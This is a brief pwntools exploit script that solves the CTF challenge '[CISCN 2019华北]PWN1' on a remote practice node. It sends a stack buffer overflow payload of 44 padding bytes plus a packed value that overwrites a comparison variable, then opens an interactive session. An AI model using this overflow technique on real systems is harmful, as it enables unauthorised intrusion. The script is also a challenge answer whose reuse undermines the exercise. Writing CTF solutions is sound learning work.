from pwn import *

p = process('./[CISCN 2019华北]PWN1')
p = remote('node4.anna.nssctf.cn',28450)
elf = ELF('./[CISCN 2019华北]PWN1')

payload = b'b'*(44) + p32(0x41348000)
p.sendline(payload)

p.interactive()

